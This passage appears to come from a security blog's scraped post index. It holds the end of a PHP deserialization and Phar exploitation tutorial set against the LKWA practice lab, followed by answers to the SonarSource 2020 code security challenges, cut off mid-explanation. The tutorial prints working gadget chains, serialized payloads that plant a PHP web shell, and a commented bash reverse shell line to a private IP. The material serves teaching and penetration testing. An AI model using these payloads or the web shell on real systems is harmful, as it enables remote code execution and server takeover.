Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, WordPress, Yii, and ZendFramework.  List all gadgets./phpggc -lGadget Chains-------------NAME                                      VERSION                        TYPE             VECTOR         I    CodeIgniter4/RCE1                         4.0.0-beta.1 &lt;= 4.0.0-rc.4     rce              __destruct          CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.0.4+           rce              __destruct          Doctrine/FW1                              ?                              file_write       __toString     *    Drupal7/FD1                               7.0 &lt; ?                        file_delete      __destruct     *    Drupal7/RCE1                              7.0.8 &lt; ?                      rce              __destruct     *    Create a POP gadget using the __destruct vector known in versions 4.0.0-rc.4 &lt;= 4.0.4+. Run the system command id using PHP’s system function.     ./phpggc CodeIgniter4/RCE2 system idO:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"*redis\";O:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:12:\"*memcached\";O:17:\"CodeIgniter\\Model\":8:{s:10:\"*builder\";O:32:\"CodeIgniter\\Database\\BaseBuilder\":2:{s:6:\"QBFrom\";a:1:{i:0;s:2:\"()\";}s:2:\"db\";O:38:\"CodeIgniter\\Database\\MySQLi\\Connection\":0:{}}s:13:\"*primaryKey\";N;s:15:\"*beforeDelete\";a:1:{i:0;s:8:\"validate\";}s:18:\"*validationRules\";a:1:{s:4:\"id.x\";a:1:{s:5:\"rules\";a:2:{i:0;s:6:\"system\";i:1;s:2:\"dd\";}}}s:13:\"*validation\";O:33:\"CodeIgniter\\Validation\\Validation\":1:{s:15:\"*ruleSetFiles\";a:1:{i:0;s:5:\"finfo\";}}s:21:\"*tempAllowCallbacks\";i:1;s:2:\"db\";O:38:\"CodeIgniter\\Database\\MySQLi\\Connection\":0:{}s:20:\"cleanValidationRules\";b:0;}s:10:\"*lockKey\";a:1:{s:1:\"x\";s:2:\"id\";}}}Hunting For POP GadgetsExamples of interesting functionalities to look for within Magic Methods:  Arbritary File Write - @unlink($fileobject), file_put_contents($this-&gt;file)  Code Execution - eval($this-&gt;injectobject);  Type Juggling - if ($username == $adminName &amp;&amp; $password == $adminPassword) { ( loose comparison operator “==”,∂ user input taken as arrays and type conversion occurs )  Authentication Bypass through Object reference - if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;getValue();, ($obj-&gt;check === $obj-&gt;secrethash) {echo \"Pass\";  SQL Injection - $sql = \"SELECT * FROM table WHERE id = \" . $id;Other Dangerous functions that might be useful to look for:  Dangerous PHP Functions - https://gist.github.com/snoopysecurity/7afd189724bc02a14a7f89d9a8284b69  DangerousPHPFunctions - https://github.com/v-p-b/DangerousPHPFunctionsWhen checking projects, git clone and execute composer install to install all dependencies, this can then be reviewed for useful POP gadget.Example (https://github.com/weev3/LKWA) Object InjectionThe following request is submitted by the application http://lkwa.local:3000/objectInjection/content.phpGET /objectInjection/content.php?object=O:8:%22stdClass%22:2:{s:4:%22data%22;s:9:%22Hey%20Dude!%22;s:4:%22text%22;s:26:%22upload%20shell%20if%20you%20can!!!%22;} HTTP/1.1Host: lkwa.local:3000User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: http://lkwa.local:3000/objectInjection/content.phpUpgrade-Insecure-Requests: 1The following code is used server-side to unserialize the object.https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L40if(isset($_REQUEST['object'])){  $var1=unserialize($_REQUEST['object']);echo \"&lt;br&gt;\";echo($var1-&gt;data); echo \"&lt;br&gt;\";echo($var1-&gt;text);}Within content.php, the following file is also included:include(\"obj_injection.php\");obj_injection.php contains the following code.// https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L3&lt;?phpclass Foo{    function __construct($filename, $data) {        $this-&gt;filename = $filename . \".txt\";        $this-&gt;data = $data;    }    function __destruct(){        file_put_contents($this-&gt;filename, $this-&gt;data);    }}?&gt;This can be exploited using a payload such as:&lt;?php class Foo{    public $filename;    public $data;}$obj = new Foo();$obj-&gt;filename = '/var/www/html/shell.php';$obj-&gt;data =  \"&lt;?php echo shell_exec(\\$_GET['e'].' 2&gt;&amp;1'); ?&gt;\"; echo serialize($obj); ?&gt;Serialized Payload:O:3:\"Foo\":2:{s:8:\"filename\";s:23:\"/var/www/html/shell.php\";s:4:\"data\";s:45:\"&lt;?php echo shell_exec($_GET['e'].' 2&gt;&amp;1'); ?&gt;\";}Example (https://github.com/weev3/LKWA) Object Injection CookieWhen the admin logs in the following cookie are set by the application:O:8:\"stdClass\":1:{s:4:\"user\";s:5:\"admin\";}This is then unserialized://https://github.com/weev3/LKWA/blob/master/objectInjection_cookie/content.php#L43if(isset($_COOKIE['username'])){  $var = unserialize($_COOKIE['username']);  echo \"&lt;br&gt; Welcome \".$var-&gt;user;}Content.php also includes obj_injection.php (include(\"obj_injection.php\");) which has the following code://http://lkwa.local:3000/objectInjection_cookie/content.php&lt;?php/** * Object Injection via Cookie */class Foo{\tpublic $cmd;    function __construct() {    }    function __destruct(){        eval($this-&gt;cmd);    }}?&gt;This can be exploited using the following payload&lt;?php  class Foo{    public $cmd;}///bin/bash -i &gt;&amp; /dev/tcp/192.168.0.11/1234 0&gt;&amp;1$obj = new Foo();$obj-&gt;cmd =  \"system('uname -a');\";echo serialize($obj); ?&gt;which generates the following serialized payloadO:3:\"Foo\":1:{s:3:\"cmd\";s:19:\"system('uname -a');\";}This can now be set as a cookie and can be sent to the page to execute uname -a on the local system.Example (https://github.com/weev3/LKWA) Object Injection ReferenceA serialized payload sent from a user request is deserialized as follows://https://github.com/weev3/LKWA/blob/master/objectref/objectref.php                  if (isset($_POST['guess'])) {                    // code...                    $obj = unserialize($_POST['input']);                    if($obj) {                        $obj-&gt;guess = $_POST['guess'];                        $obj-&gt;secretCode = rand(500000,999999);                        if($obj-&gt;guess === $obj-&gt;secretCode) {                            echo \"&lt;p class='text-success'&gt;You Win !!!!!&lt;/p&gt;\";                        }                        else{                        \techo \"&lt;p class='text-danger'&gt;Loser!!!!&lt;/p&gt;\";                        }This check can be bypassed by calling both objects and referencing each other.&lt;?php  class Object1 {   public $guess;   public $secretCode; } $obj = new Object1();$obj-&gt;guess =  &amp;$obj-&gt;secretCode;echo serialize($obj); ?&gt;Payload:O:7:\"Object1\":2:{s:5:\"guess\";N;s:10:\"secretCode\";R:2;}The following request can now be sentPOST /objectref/objectref.php HTTP/1.1Host: lkwa.local:3000User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 112Origin: http://lkwa.local:3000Connection: closeReferer: http://lkwa.local:3000/objectref/objectref.phpCookie: PHPSESSID=741de8227f5dedc8918a2018980d0819; username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7DUpgrade-Insecure-Requests: 1guess=ss&amp;input=%4f%3a%37%3a%22%4f%62%6a%65%63%74%31%22%3a%32%3a%7b%73%3a%35%3a%22%67%75%65%73%73%22%3b%4e%3b%73%3a%31%30%3a%22%73%65%63%72%65%74%43%6f%64%65%22%3b%52%3a%32%3b%7dReal World Vulnerabilities  Drupal 7.34 Admin PHP Object Injection  Executing Arbitrary Code on Bitdefender Helpdesk  Prestashop Remote Code ExecutionUseful Notes  Leading zeroes &amp; Arbitrary Chars can be used which won’t change logic: O:008:”stdClass”:0001**s:006:”bypass”;b:1;}  One way to find PHP deserialization black box is to provide a serialized PDO object to injection points. This will usually end in an error 500 response which is an indication of PHP deserialization. The php-object-injection-check burp extension can be used to automate this: https://github.com/securifybv/PHPUnserializeCheck  https://github.com/ricardojba/poi-slinger burp extension can be used to quickly create out of band payloads from PHPGGC during testing.How to PatchUse a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.References/Further Reading  https://notsosecure.com/remote-code-execution-via-php-unserialize/  https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection  https://www.pentestpeople.com/php-deserialisation-object-injection/  https://securitycafe.ro/2015/01/05/understanding-php-object-injection/  https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf  https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html  https://web.archive.org/web/20150317142538/https://scott.arciszewski.me/research/view/php-framework-timing-attacks-object-injection  https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/  https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#babyh-master-php-2017  https://github.com/TYPO3/phar-stream-wrapper  https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html  https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missingPhar File FormatPhar (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses single file format which can be used to store and execute multiple PHP code. Phar files contain metadata about the files in the archive. In a phar file, metadata is stored in a serialized formatA structure of a PHAR file is as follow  A stub – which is a PHP code sequence acting as a bootstrapper when the Phar is being run as a standalone application; as a minimum, it must contain the following code:&lt;?php __HALT_COMPILER();  A manifest describing a source file included in the archive; optionally, holds serialized meta-data (this serialized chunk is a critical link in the exploitation chain as we will see further on)  A source file (the actual Phar functionality)  An optional signature, used for integrity checksPhar files can be called using the following URI: zphar://full/or/relative/pathz. Furthermore, a phar file extension doesn’t get checked when declaring a stream, making phar files veritable polyglot candidates. If a filesystem function is called with a phar stream as an argument, the Phar’s serialized metadata automatically gets unserialized, by design. More about the PHP Phar format can be seen here: https://www.php.net/manual/en/book.phar.phpPhar DeserializationDiscovered by Sam Thomas and initially discovered by Orange Tsai (Separately), if a file operation is performed on a phar file via the phar:// wrapper, the phar file’s metadata would be unserialized. As such an attacker could perform PHP object injection without the use of the unserialize() function by uploading a phar file.Sam Thomas’s work can be seen below:  BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Slides  BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It VideoRequirements for a Successful Phar Deserialization  A PHP filesystem function that can be controlled which will trigger unserialize()  The ability to upload a PHAR file to the target system and the path of this file to be knownThe following file system functions can triggerunserialize() by providing a phar:// wrappercopy                file_exists         file_get_contents   file_put_contents   file                fileatime           filectime           filegroup           fileinode           filemtime           fileowner           fileperms           filesize            filetype            fopen               is_dir              is_executable       is_file             is_link             is_readable         is_writable         lstat               mkdir               parse_ini_file      readfile            rename              rmdir               stat                touch               unlink  Note: Just like normal object injection, PHP Magic Methods and autoloading/include of the POP gadget to trigger is still needed.Example (https://github.com/weev3/LKWA) Phar DeserializationAn upload functionality exists in upload.php&lt;?phpinclude(\"sidebar.php\");$target_dir = \"uploads/\";$target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));// Check if image file is a actual image or fake imageif(isset($_POST[\"submit\"])) {    if($imageFileType !== \"PHAR\") {        $uploadOk = 1;    } else {        echo \"File is not a PHAR file.\";        $uploadOk = 0;    }}// Check if file already existsif (file_exists($target_file)) {    echo \"Sorry, file already exists.\";    $uploadOk = 0;}// Allow certain file formatsif($imageFileType != \"phar\") {    echo \"Sorry, only PHAR file is allowed.\";    $uploadOk = 0;}// Check if $uploadOk is set to 0 by an errorif ($uploadOk == 0) {    echo \"Sorry, your file was not uploaded.\";// if everything is ok, try to upload file} else {    if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {        echo \"The file \". basename( $_FILES[\"fileToUpload\"][\"name\"]). \" has been uploaded.\";    } else {        echo \"Sorry, there was an error uploading your file.\";    }}?&gt;https://github.com/weev3/LKWA/blob/master/phar_deserial/upload.phpThis above code checks if a given upload is a phar file, the file_exists function is also used to see if the file has already been uploaded. Aftr the checks, the file is uploaded. This functionality can be used to upload a PHAR file.Within phar_deserial.php, the following code can be seen:include(\"sidebar.php\");class log{\tpublic $filename=\"log.txt\";\tpublic $data=\"log\";    function __wakeup(){        file_put_contents($this-&gt;filename, $this-&gt;data);    }}if (file_exists($_GET['file'])) { $var = new log();}https://github.com/weev3/LKWA/blob/master/phar_deserial/phar_deserial.phpSince the file_exists($_GET[‘file’] function is used with a user provided input. It is possible to set the value of the input to the previously uploaded Phar file. Example: phar://../uploads/phar_file.phar. The PHP application will perform a filesystem call on the provided wrapper, such as verifying if the file exists on the disk by calling file_exists(“phar://../uploads/phar_file.phar”). and the Phar’s metadata will be unserialized, taking advantage of the gadgets/POP chains to complete the exploitation chain. In this instance, the __wakeup magic method can be leveraged for code execution by writing some PHP code and calling it.The following code can be used to create a PHAR file&lt;?phpclass log{        function __wakeup(){    }}$payload = new log();$payload-&gt;filename = 'shell.php5';$payload-&gt;data = \"&lt;?php echo shell_exec(\\$_GET['e'].' 2&gt;&amp;1'); ?&gt;\";var_dump($payload);// create new Phar@unlink(\"payload.phar\");$phar = new Phar('payload.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.txt', 'text');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');//set payload$phar-&gt;setMetadata($payload);$phar-&gt;stopBuffering();?&gt;This phar file can be uploaded using upload.php.This payload.phar can be called through the phar_deserial.php file.GET /phar_deserial/phar_deserial.php?file=phar%3a%2f%2fpharfile.phar HTTP/1.1Host: lkwa.local:3000User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7DUpgrade-Insecure-Requests: 1To test if things are working locally, you can testing using a code such as&lt;?phpclass log{\tpublic $filename=\"log.txt\";\tpublic $data=\"log\";    function __wakeup(){        file_put_contents($this-&gt;filename, $this-&gt;data);    }}// output: ripsinclude('phar://payload.phar');?&gt;Phar Deserialization Real World Vulnerabilities  DomPDF Phar Serialization  LimeSurvey &lt; 3.16 - Remote Code Execution  mpdf Insecure PHP deserialization through phar:// wrapper  TCPDF Phar Deserialization  phpbb3 Phar Deserialization  PEAR Archive_Tar1Useful Notes  Inclusion of the Phar file for deserialization can be local or remote  If a file upload functionality only allows jpg, you can use a phar-jpg polyglot: https://github.com/kunte0/phar-jpg-polyglot  If you are trying to leverage a __destruct magic method as part of your POP chain and the if destructor is never called, you can use “fast destruct method” in PHPGGC to make sure it’s called right after the unserialize. The -f option with PHPGGC will place your popchain in an array and overwrite its entry with another value, losing the only reference to your instance.References  https://blog.ripstech.com/2018/new-php-exploitation-technique/  https://www.drupal.org/sa-core-2020-013  https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf  https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066  https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It’s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf  https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce"
  },
  
  {
    "title": "Code Security Advent Calendar 2020 Answers",
    "url": "/posts/code-security-advent-calendar-answers/",
    "categories": "ctf",
    "tags": "code security advent calendar",
    "date": "2020-12-29 03:25:52 +0800",
    





    
    "snippet": "SonarSource is a company focused on code quality and static analysis. This year, SonarSource, along with RIPS Technologies will be tweeting code challenges from real world vulnerabilities on their ...",
    "content": "SonarSource is a company focused on code quality and static analysis. This year, SonarSource, along with RIPS Technologies will be tweeting code challenges from real world vulnerabilities on their twitter @SonarSource.More information regarding this can be seen here: https://blog.sonarsource.com/code-security-advent-calendar-2020/.This blog post will go through some of the solutions. Note: this might be wrong from the intended solution given by SonarSourceChallenge 1from django.contrib import auth, messagesfrom django.http import HttpResponseRedirectfrom django.shortcuts import redirect, renderfrom django.utils.translation import ugettext as _from django.views.generic import CreateView, FormView, RedirectViewclass RegisterView(CreateView):    model = User    form_class = RegistrationForm    template_name = \"register.html\"    success_url = \"/\"    def post(self, request, *args, **kwargs):        form = self.form_class(data=request.POST)        if form.is_valid():            user = form.save(commit=False)            password = form.cleaned_data.get(\"password1\")            user.set_password(password)            user.save()        return redirect(\"login\")                    def dispatch(self, request, *args, **kwargs):        if self.request.user.is_authenticated:            return HttpResponseRedirect(self.get_success_url())        return super().dispatch(self.request, *args, **kwargs)    def get_success_url(self):        if \"next\" in self.request.GET and self.request.GET[\"next\"] != \"\":            return self.request.GET[\"next\"]        else:            return self.success_url                            def get_form_class(self):        return self.form_classThe issue here arises from the get_success_url function and an Open Redirect vulnerability.. This function checks for a parameter called next and makes a redirect to this parameter value. As such it is possible to djangoapplication?next=//attackersite.url. This redirect will happen after self.request.user.is_authenticated is successful.Challenge 2package com.example.restservice;import java.io.File;import java.io.IOException;import java.io.InputStream;import java.net.HttpURLConnection;import java.net.URL;import java.util.concurrent.atomic.AtomicLong;import java.util.logging.Logger;import org.springframework.web.bind.annotation.*;import org.apache.commons.io.IOUtils;import org.apache.http.entity.StringEntity;import org.apache.http.entity.ContentType;import org.apache.http.client.methods.HttpPost;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClients;import org.apache.http.client.methods.CloseableHttpResponse;import org.apache.http.util.EntityUtils;@RestControllerpublic class RequestController {    private static final Logger logger = null;    private final AtomicLong counter = new AtomicLong();    @RequestMapping(value = {\"/api/adapter/{adapter}/activate/{b}\"},             method = RequestMethod.POST, produces = \"application/json\")    public String activateAdapter(            @PathVariable(\"adapter\") String connName,             @PathVariable(\"b\") Integer b) throws IOException {        logger.info(\"activating adapter.\");        HttpPost post = new HttpPost(\"https://\" + connName + \"/v1/boot\");        String requestBody = \"{\\\"activate\\\":\" + Integer.toString(b) + \"}\";        StringEntity requestEntity = new StringEntity(            requestBody,             ContentType.APPLICATION_JSON        );        post.setEntity(requestEntity);        try (CloseableHttpClient httpClient = HttpClients.createDefault();             CloseableHttpResponse response = httpClient.execute(post)) {            logger.info(\"response:\" + response.getEntity());            return EntityUtils.toString(response.getEntity());        }    }}The issue here arises from the adapter parameter coming from user input. This is given as part of the HttpPost constructor and a new object called postis made which has “https://” + connName + “/v1/boot”. This is then given to the httpClient.execute method which will make a request to the crafted url and return the response. This can be abused for an Server Side Request Forgery (SSRF) attackChallenge 3&lt;?php use Symfony\\Component\\Routing\\Annotation\\Route;use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;use Symfony\\Component\\HttpFoundation\\Request;class LoginController extends AbstractController {    private DOMDocument $doc;    private $authFile = 'employees.xml';        private function auth($userId, $passwd) {        $this-&gt;doc-&gt;load($this-&gt;authFile);        $xpath = new DOMXPath($this-&gt;doc);        $filter = \"[loginID=$userId and passwd='$passwd'][position()&lt;=1]\";        $employee = $xpath-&gt;query(\"/employees/employee$filter\");        return ($employee-&gt;length == 0) ? false : true;    }        public function index(Request $request) {        $userId = (int)$request-&gt;request-&gt;get('userId');        $password = $request-&gt;request-&gt;get('password');        if ($request-&gt;request-&gt;get('submit') !== null) {            try {                if (!$this-&gt;auth($userId, $password)) {                    return $this-&gt;json(['error' =&gt; \"Wrong $userId.\"]);                }                else {                    $this-&gt;loginCompleted(true);                    $this-&gt;loadUserInformation($employee);                }            } catch (Exception $e) {                return $this-&gt;json(['error' =&gt; \"Login Failed.\"]);            }        }        return $this-&gt;json(['error' =&gt; \"Login Succeeded.\"]);    }}The vulnerability here is an XPath Injection. Within function auth, the $userId and $passwd parameter is used to create an XPath query without any sanitization/validation: loginID=$userId and passwd='$passwd'. This query is used to check if the provided userid and password exists within employees.xml. This check is within the line return ($employee-&gt;length == 0) ? false : true;. This could be abused by a user and bypass this check by injecting something like ' OR '6'='6 .Challenge 4using System.IO;using System.Net;using System.Net.Http;using Microsoft.AspNetCore.Mvc;namespace core_api.Controllers{    public class DataDownloadController : Controller {        public readonly string AvatarFolder = \"images/avatars/\";        [HttpGet]        public HttpResponseMessage GetAvatar(string image) {            if (string.IsNullOrWhiteSpace(image) || image.Contains(\"/\")) {                return new HttpResponseMessage(HttpStatusCode.BadRequest) {                    Content =  new StringContent(\"Valid avatar required\")};                }            string img = System.IO.Path.Combine(AvatarFolder, image);            if (!img.Contains(AvatarFolder) || !System.IO.File.Exists(img)) {                 return new HttpResponseMessage(HttpStatusCode.NotFound) {                    Content =  new StringContent(\"Avatar not found\")};            }            var fileInfo = new System.IO.FileInfo(img);            var type = fileInfo.Extension;            var c = new StreamContent(fileInfo.OpenRead());            c.Headers.ContentType = new System.Net.Http.Headers.                MediaTypeHeaderValue(\"image/\" + type);            return new HttpResponseMessage(HttpStatusCode.OK){Content = c};        }    }}In the above C# code, the source where tainted data is coming from the HttpGet method. This is then given to the GetAvatar as an argument. This function checks if the user value contains a / character and if it does, an error is returned to the user. If this check is not triggered, then the user provided value is combined with images/avatar path using the System.IO.Path.Combine method. A new constructor is created with the System.IO.FileInfo class which provides methods for creation, copying, deletion, moving, and opening of files. The File.OpenRead method is used to fetch the file in this path. On windows systems, the ..\\ pattern or ../ pattern can be used to traverse directories. As such, the above code is vulnerable to Path Traversal.Challenge 5from django.contrib import messagesfrom django.shortcuts import render, redirectfrom django.contrib.sites.shortcuts import get_current_sitefrom django.template.loader import render_to_stringfrom django.utils.http import urlsafe_base64_encode, urlsafe_base64_decodefrom django.utils.encoding import force_bytes, force_textfrom django.views.decorators.http import require_http_methodsfrom hashlib import sha1from project.decorators import check_recaptchafrom project.forms import UserSignUpFormfrom project.settings import configfrom sendgrid import SendGridAPIClientfrom sendgrid.helpers.mail import Mailfrom django.contrib.auth import get_user_modelUser = get_user_model()@check_recaptcha@require_http_methods([\"POST\"])def register(request):    form = UserSignUpForm(request.POST)    if form.is_valid() and request.recaptcha_is_valid:        user = form.save(commit=False)        user.is_active = False        user.save()        message = render_to_string('mail/activate.html', {            'user': user,            'uid': urlsafe_base64_encode(force_bytes(user.pk)),            'token': sha1(force_bytes(user.pk)).hexdigest(),        })        message = Mail(            from_email='noreply@' + get_current_site(request).domain,            to_emails=request.POST.get('email'),            subject='Your account activation email',            html_content=message)        response = SendGridAPIClient(config['SG_API_KEY']).send(message)        messages.add_message(request, messages.SUCCESS, 'Verification email sent.')    else:        return render(request, 'account/register.html', {'form': form})    return render(request, 'account/register.html', {'form': UserSignUpForm()})In the above code, the SHA1 hashing algorithm is used without a salt to generate a token.: sha1(force_bytes(user.pk)).hexdigest(). As such, an attacker could generate a list of SHA1 hashes and try and brute force the password reset email token of a user. The vulnerability here is Insecure Token Generation.Challenge 6package org.example;import javax.servlet.ServletException;import javax.servlet.http.*;import java.io.*;public class IndexServlet extends HttpServlet {    private String referer;    private ExportIcalManager exportManager;    private void exportIcal(HttpServletResponse res, String sessionId)             throws ServletException, IOException {        res.addHeader(\"Access-Control-Allow-Origin\", referer);        res.setContentType(\"text/plain\");        ExportIcalManager exportManager = new ExportIcalManager(sessionId);        String filePath = exportManager.exportIcalAgendaForSynchro();        OutputStream os = res.getOutputStream();        FileInputStream fs = new FileInputStream(filePath);        int i;        while (((i = fs.read()) != -1)) { os.write(i); }        os.close();    }    protected void doPost(HttpServletRequest req, HttpServletResponse res)             throws ServletException, IOException {        HttpSession session = req.getSession();        referer = req.getParameter(\"referer\");        exportIcal(res, req.getRequestedSessionId());    }}This vulnerability the above code is exposed to is Misconfigured Cross Origin Resource Sharing (Cors). The referer header from a user’s request is used to set the Access-Control-Allow-Origin header. An attacker could spoof this header to provide a wildcard *, or modify this through a redirect from an attacker site to allow cross origin communication.Challenge 7&lt;?phpclass Upload{    private $detect_mime = TRUE;    private $type_regex = '/^([a-z\\-]+\\/[a-z0-9\\-\\.\\+]+)(;\\s.+)?$/';    public function do_upload($field = 'userfile') {        $file = $_FILES[$field];        $this-&gt;file_size = $file['size'];        $this-&gt;_file_mime_type($file);    }    private function _file_mime_type($file) {        if (function_exists('finfo_file')) {            $finfo = @finfo_open(FILEINFO_MIME);            $mime = @finfo_file($finfo, $file['tmp_name']);            if (preg_match($this-&gt;type_regex, $mime, $match)) {                return $this-&gt;file_type = $match[1];            }        }        $cmd = 'file --brief --mime '.$file['name'].' 2&gt;&amp;1';        exec($cmd, $mime, $status);        if ($status === 0 &amp;&amp; preg_match($this-&gt;type_regex, $mime, $match)) {            return $this-&gt;file_type = $match[1];        }    }}$upload = new Upload();$upload-&gt;do_upload();The do_upload function takes a user provided file (i assume) and the file_mime_type function is called to open this file. The name of this file is taken by the $file[‘name’] object and is provided as part to the exec ($cmd = 'file --brief --mime '.$file['name'].' 2&gt;&amp;1';) function. The vulnerability here is a Command Injection.Challenge 8using Microsoft.AspNetCore.Html;using Microsoft.AspNetCore.Mvc;using System.Text.Encodings.Web;using System;using System.Threading;using System.Threading.Tasks;namespace Core31Demo.Controllers{    public class HomeController : Controller {                [HttpGet]        public async Task&lt;IActionResult&gt; Logout(string logoutId) {            ViewBag.Logout = \"Please confirm logout &amp;#8230;\";            if (User.Identity.IsAuthenticated == false) {                return await Logout(new LogoutViewModel { LogoutId = logoutId });            }            return View(\"ConfirmLogout\");        }        [HttpPost][ValidateAntiForgeryToken]        public async Task&lt;IActionResult&gt; Logout(LogoutViewModel model) {            await PerformSignOutAsync(model);            ViewData[\"Logout\"] = model.LogoutId;            return View(\"Logout\");        }                static async Task PerformSignOutAsync(LogoutViewModel model) {            // sign out logic            // throw new NotImplementedException();        }    }        public class LogoutViewModel {         public string LogoutId;     }}// Views/Home/Logout.cshtml&lt;div class=\"page-header\"&gt;    &lt;h1&gt;@Html.Raw(@ViewBag.Logout)&lt;/h1&gt;&lt;/div&gt;&lt;div class=\"logout-back\"&gt;&lt;a asp-controller=\"Home\"      asp-action=\"Login\" asp-route-id=\"@ViewData[\"Logout\"]\"&gt;back&lt;/a&gt;&lt;/div&gt;A Cross-site Scripting (XSS) issue exists in the above code. User input is taken as the logoutId parameter ( through HttpGet). A new LogoutViewModel instance is created with the logoutId parameter: Logout(new LogoutViewModel { LogoutId = logoutId });. This is then given to the Task method which bind its to the @ViewBag.Logout model attribtue. The method Html.Raw() returns an IHtmlString with any HTML encoding. As such, XSS is possible.Challenge 9from __future__ import unicode_literalsimport osimport shutilimport tempfileimport tracebackimport zipfilefrom django import formsfrom django.http.response import HttpResponseRedirectfrom django.utils.translation import ugettext_lazy as _from django.views.generic import FormViewfrom django.views.decorators.csrf import csrf_exemptclass AddonUploadView(FormView):    form_class = forms.Form    template_name = \"package/addon/upload.jinja\"    def get_addon_path(self):        filename = os.path.basename(self.request.GET.get(\"my_file\"))        tmp_token = self.request.GET.get('my_token')        path = os.path.join(tempfile.gettempdir(), tmp_token, filename)        if not os.path.isfile(path):            raise ValueError(\"Error! File not found.\")        if hasattr(os, \"geteuid\") and os.stat(path).st_uid != os.geteuid():            raise ValueError(\"Error! File not owned by current user.\")        return path    @csrf_exempt    def form_valid(self, form):        try:            installer.install_package(self.get_addon_path())            response[\"success\"] = True        except Exception:            os.unlink(self.get_addon_path())            response[\"success\"] = False        return self.render_to_response(response)Three issues are described in the above code:  Cross Site Request Forgery - @csrf_exempt in Django removes Cross Site Request Forgery protection allowing the request to be forged by an attacker.  Path Traversal - The path generated by the AddonUploadView function is user tainted.        filename = os.path.basename(self.request.GET.get(\"my_file\"))        tmp_token = self.request.GET.get('my_token')        path = os.path.join(tempfile.gettempdir(), tmp_token, filename)This is then given to the os.stat(path) function which will execute the file provided by the user tainted path allowing execution of a user controlled file. This same also exists in os.unlink(self.get_addon_path()) where a path traversal can lead to arbritary file delete.Challenge 10import javax.servlet.*;import javax.servlet.annotation.WebServlet;import java.io.*;import java.util.Enumeration;import java.util.HashSet;import java.util.Set;import java.util.zip.ZipEntry;import java.util.zip.ZipFile;import org.apache.commons.io.FileUtils;import org.apache.commons.io.IOUtils;@WebServlet(value=\"/unzip\", name=\"ZipUtils\")class ZipUtils extends GenericServlet {    private static final String BASE_DIR = \"projects\";    @Override    public void service(ServletRequest req, ServletResponse res) throws IOException {        File zipFile = new File(BASE_DIR, req.getParameter(\"file\"));        if (zipFile.getCanonicalPath().startsWith(BASE_DIR)) {            File indir = new File(\"/tmp/local/my_jars\");            unjar(zipFile, indir);        }    }    private File[] unjar(File uploadFile, File inDir) throws IOException {        String uploadFileName = inDir + File.separator + uploadFile.getName();        ZipFile uploadZipFile = new ZipFile(uploadFile);        Set&lt;File&gt; files = new HashSet&lt;File&gt;();        Enumeration entries = uploadZipFile.entries();        // unpack uploaded zip file        while (entries.hasMoreElements()) {            ZipEntry entry = (ZipEntry) entries.nextElement();            File fe = new File(uploadFileName, entry.getName());            if (entry.isDirectory()) {                fe.mkdirs();            } else {                if (fe.getParentFile() != null                 &amp;&amp; !fe.getParentFile().exists()) {                    fe.getParentFile().mkdirs();                }                files.add(fe);                IOUtils.copy(uploadZipFile.getInputStream(entry),                     new BufferedOutputStream(new FileOutputStream(fe)));            }        }        uploadZipFile.close();        return files.toArray(new File[files.size()]);    }}The above code is vulnerable to Zip Path Traversal. User input (source) is entering via uploadZipFile.entries() method (Map.Entry). The code iterates through this Map and the getInputStream method is used to fetch the file and IOUtils.copy is used to copy bytes from an 